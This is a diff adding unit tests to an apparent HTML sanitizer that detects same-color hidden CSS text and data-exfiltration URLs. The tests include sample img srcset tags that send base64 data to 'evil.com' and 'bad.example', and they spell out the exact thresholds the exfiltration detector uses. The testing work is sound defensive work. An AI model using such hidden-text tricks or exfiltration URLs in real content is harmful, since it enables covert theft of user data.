@@ -542,6 +542,67 @@ describe("unit: isHiddenStyle exact verdicts", () => {
       assert.equal(isHiddenStyle(`background:${proto}`), false));
 });
 
+// One row per numeric token, with the verdict it earns in each of the three
+// channel positions: an rgb() channel, an hsl() hue, an hsl() saturation.
+// `true` means the token RESOLVED (both sides canonicalize to the same concrete
+// color, so the text is hidden); `false` means the parser rejected it and the
+// declaration failed open.
+const COLOR_TOKEN_CASES = [
+  ["0", true, true, true],
+  ["255", true, true, true],
+  ["128.5", true, true, true],
+  [".5", true, true, true],
+  ["+5", true, true, true],
+  // A hue is an <angle> or a <number>; `%` is neither.
+  ["+5%", true, false, true],
+  ["50%", true, false, true],
+  ["100%", true, false, true],
+  ["0%", true, false, true],
+  // A fraction needs a digit on both sides of the dot.
+  ["1.", false, false, false],
+  [".", false, false, false],
+  // css-tree re-serializes this as the two numbers `1.2 .3`, so no channel
+  // parser ever receives it whole: rgb() then counts six channels and fails
+  // open, while hsl() reads four components and takes the last as an alpha.
+  ["1.2.3", false, true, true],
+  ["", false, false, false],
+  ["abc", false, false, false],
+  // Angle units belong to the hue alone; a signed value is a hue-only shape too.
+  ["90deg", false, true, false],
+  ["0.5turn", false, true, false],
+  [".5rad", false, true, false],
+  ["-45", false, true, false],
+  ["+45grad", false, true, false],
+  // The declaration value is lowercased before parsing, so the unit's case
+  // never reaches the angle grammar.
+  ["90DEG", false, true, false],
+];
+
+describe("unit: rgb()/hsl() numeric channel tokens", () => {
+  // The same token paints both the text and its background, so a token the
+  // parser resolves is a same-color hide and one it rejects fails open — the
+  // verdict reads out the token grammar. The comma form is load-bearing:
+  // css-tree re-serializes the space-separated form without its separating
+  // whitespace (`rgb(50% 0 0)` becomes `rgb(50%0 0)`), fusing two channels into
+  // one before the parser sees them.
+  const sameColor = (fn) => `color:${fn};background-color:${fn}`;
+  for (const [token, rgb, hue, saturation] of COLOR_TOKEN_CASES) {
+    const shown = JSON.stringify(token);
+    it(`rgb() channel ${shown}`, () =>
+      assert.equal(
+        isHiddenStyle(sameColor(`rgb(${token},${token},${token})`)),
+        rgb,
+      ));
+    it(`hsl() hue ${shown}`, () =>
+      assert.equal(isHiddenStyle(sameColor(`hsl(${token},100%,50%)`)), hue));
+    it(`hsl() saturation ${shown}`, () =>
+      assert.equal(
+        isHiddenStyle(sameColor(`hsl(90,${token},50%)`)),
+        saturation,
+      ));
+  }
+});
+
 // ─── invariant: one rendered color, one verdict ──────────────────────────────
 //
 // A browser renders every spelling of a color identically, so isHiddenStyle
@@ -912,6 +973,38 @@ describe("unit: checkExfilUrl exact verdicts", () => {
     assert.ok(slug.length < 200);
     assert.equal(checkExfilUrl("https://e.com/p?d=" + slug), null);
   });
+  // The character-mix gate at ONE length: every value below is exactly 40
+  // characters over `[A-Za-z0-9-]`, so the length floor and the 200-char query
+  // rule are held constant and only the mix moves the verdict. The `-` keeps
+  // the standard-base64 arm out of it — that arm carries no mix requirement and
+  // would claim the uppercase-only value by itself.
+  for (const [label, value, expected] of [
+    ["uppercase and digits", "Ab3-".repeat(10), "suspicious query parameter"],
+    ["uppercase only", "ABC-".repeat(10), null],
+    ["digits only", "012-".repeat(10), null],
+    ["lowercase word-slug", "abc-".repeat(10), null],
+  ])
+    it(`${expected ? "flags" : "leaves"} a 40-char base64url value of ${label}`, () => {
+      assert.equal(value.length, 40);
+      assert.equal(checkExfilUrl("https://e.com/p?d=" + value), expected);
+    });
+  it("applies the mix gate only past the 40-char floor", () =>
+    assert.equal(
+      checkExfilUrl("https://e.com/p?d=" + "Ab3-".repeat(9) + "Ab3"),
+      null,
+    ));
+  // Rejoining `.`-chunks demands the same mix, which is what separates a
+  // chunked payload from a batch REST path of tickers or numeric ids.
+  for (const [label, chunk, expected] of [
+    ["mixed case and digits", "Ab3xYz9Q", "encoded data blob in path segment"],
+    ["uppercase tickers", "ABCDEFGH", null],
+    ["numeric ids", "01234567", null],
+  ])
+    it(`${expected ? "flags" : "leaves"} a dot-chunked path segment of ${label}`, () => {
+      const segment = Array(20).fill(chunk).join(".");
+      assert.equal(segment.replace(/\./g, "").length, 160);
+      assert.equal(checkExfilUrl("https://e.com/" + segment), expected);
+    });
   it("flags a query exactly past the length threshold (201), not at it (200)", () => {
     assert.equal(
       checkExfilUrl("https://e.com/p?n=" + "-".repeat(198)),
@@ -1009,9 +1102,28 @@ describe("unit: checkExfilUrl exact verdicts", () => {
     ));
   it("flags a hex blob in a fragment param (fragment walk)", () =>
     assert.equal(
-      checkExfilUrl(`https://e.com/p?a=1#x=${hex64}`),
+      // Past the digest ceiling, so the value is bulk data rather than a
+      // fingerprint; still under the 200-char long-fragment backstop, so the
+      // reason below is the fragment WALK and not the length check.
+      checkExfilUrl(`https://e.com/p?a=1#x=${"a".repeat(129)}`),
       "suspicious query parameter",
     ));
+  it("leaves a digest-length hex value alone (fingerprint, not payload)", () => {
+    // A cache-buster, an ETag, a git commit and a signed-CDN token are all a
+    // bare digest under a GENERIC name. Every enumerated digest length is
+    // covered, and both directions are asserted, so the exemption is pinned as
+    // a boundary rather than as one benign example.
+    for (const len of [32, 40, 56, 64, 96, 128])
+      assert.equal(
+        checkExfilUrl(`https://cdn.example.com/a.js?v=${"a".repeat(len)}`),
+        null,
+        `a ${len}-char hex digest was reported`,
+      );
+    assert.equal(
+      checkExfilUrl(`https://cdn.example.com/a.js?v=${"a".repeat(129)}`),
+      "suspicious query parameter",
+    );
+  });
   it("flags a long base64 blob in a path segment (beacon w/o query)", () =>
     assert.equal(
       checkExfilUrl(`https://e.com/${"A".repeat(220)}`),
@@ -1180,8 +1292,10 @@ describe("invariant: a parameter's exfil verdict ignores whether it carries an `
       "suspicious query parameter",
     ],
     [
+      // Past the digest ceiling: an all-hex value AT an MD5/SHA length is a
+      // fingerprint, so a hex payload has to be longer to read as bulk data.
       "a hex blob",
-      "a".repeat(16) + "b3c4d5e6f7081920",
+      "a".repeat(120) + "b3c4d5e6f7081920",
       "suspicious query parameter",
     ],
     ["an ordinary word", "guide", null],
@@ -1963,6 +2077,30 @@ describe("unit: detectExfil HTML-attr + node types", () => {
     );
     assert.equal(threat.target, "evil.com");
   });
+  it("strips a whole RUN of trailing commas off a srcset candidate", () => {
+    // The first candidate's URL run ends in `,,,`: the whole comma tail comes
+    // off (a URL keeping it would not parse to `evil.com`) and the run counts
+    // as bare, so the second candidate after it is parsed too.
+    assert.deepEqual(
+      detectExfil(
+        `<img srcset="https://evil.com/a.png?data=${b64},,, https://bad.example/b.png?data=${b64} 2x">`,
+      ),
+      [
+        {
+          isImage: true,
+          autoFetched: true,
+          reason: "suspicious query parameter",
+          target: "evil.com",
+        },
+        {
+          isImage: true,
+          autoFetched: true,
+          reason: "suspicious query parameter",
+          target: "bad.example",
+        },
+      ],
+    );
+  });
   it("keeps a srcset URL that itself contains commas intact (no split shredding)", () => {
     const threat = onlyThreat(
       `<img srcset="https://evil.com/b.png?a=1,2&data=${b64} 2x">`,
@@ -2144,6 +2282,29 @@ describe("splice fidelity and regressions", () => {
       assert.equal(applyHtml(input), input, input);
     }
   });
+  // Whether a prose run leaves a construct open decides the fate of the hidden
+  // span behind it: an open construct absorbs it as tag soup (fail open, source
+  // untouched), a closed or non-markup run leaves it a real element to splice.
+  // Only the tail after the run's last `>` can leave anything open.
+  for (const [absorbs, prefix, why] of [
+    [false, "a < b", "a bare `<` in prose is not markup"],
+    [false, "i <3 u", "an emoticon is not markup"],
+    [true, "<a", "an unterminated open tag"],
+    [true, "</A", "an unterminated end tag"],
+    [true, "<!", "a bogus comment opener"],
+    [true, "<?", "a processing-instruction-ish opener"],
+    [false, "<a>b", "a terminated tag with prose behind it"],
+    [true, "<a>b <span", "a terminated tag then a reopened one"],
+    [false, "<b>x</b> y > z", "several `>`, and the last tail is clean"],
+  ])
+    it(`${absorbs ? "absorbs" : "splices"} the hidden span behind ${why}`, () => {
+      const hidden = '<span style="display:none">gone</span>';
+      const input = `t ${prefix} ${hidden}`;
+      assert.equal(
+        applyHtml(input),
+        absorbs ? input : `t ${prefix} ${hid(hidden)}`,
+      );
+    });
   for (const [tag, body] of [
     ["style", "<!A"],
     ["script", "<!--a-->"],
